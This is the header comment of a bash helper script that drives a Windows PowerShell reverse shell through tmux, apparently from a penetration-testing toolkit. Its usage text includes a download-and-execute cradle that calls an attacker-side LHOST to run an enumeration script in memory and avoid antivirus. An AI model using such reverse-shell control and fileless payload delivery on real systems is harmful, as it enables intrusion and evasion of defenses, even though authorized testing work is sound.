#!/usr/bin/env bash
# Send ONE command to a Windows PowerShell reverse-shell tmux tab and return its clean output.
# Windows counterpart to vm-rsh.sh, built to the shell-interaction discipline (docs/shell-interaction.md):
#   * ONE command per call. NO injected sentinels / markers / delimiters / nonce strings, and NO
#     string-literal splitting to dodge the command echo. Output is framed by the SHELL'S OWN prompt
#     (the natural boundary), not by tokens we emit: the echoed command line and the trailing prompt
#     are stripped, everything between is returned.
#   * $-safety WITHOUT encoding tricks: the operator's command is sent as a human would type it; the
#     one lossy layer (the VM's `bash -c`, which would expand $env:/$var/backticks) is neutralised by
#     escaping \ $ " ` for exactly that layer. You type plain PowerShell; it arrives intact.
#   * Completion is detected by pane STABILITY + a returned prompt (the command finished and the shell
#     printed its next prompt), never by waiting on a marker we injected.
#   * Liveness: if the tab shows an ATTACKER bash/zsh prompt instead of a PS prompt, the reverse shell
#     is dead (it fell back to the attacker box) -> warn LOUDLY (the false-RCE trap: whoami would then
#     return root/kali, not the target). This mirrors the doc's "probe with whoami" recovery.
#
# Usage: bash win-rsh.sh [--win shell] [--timeout 60] <session> '<one powershell command>'
#        bash win-rsh.sh --file cmd.ps1 [--win shell] <session>   # a short script (lines joined with ;)
#   For $-heavy / multi-statement enumeration, prefer hosting a readable .ps1 and running it in-memory:
#   win-rsh.sh <eng> "IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/enum.ps1')"
#   (the cradle has no $ so it rides clean, the script runs on-target, nothing hits disk to trip AV).
# Assumes a live PS reverse shell in tmux window <session>:<win> (default 'shell'). VM_SH overridable
# for tests. Prints a diagnostic to stderr + exits 1 if no prompt returns within the timeout.
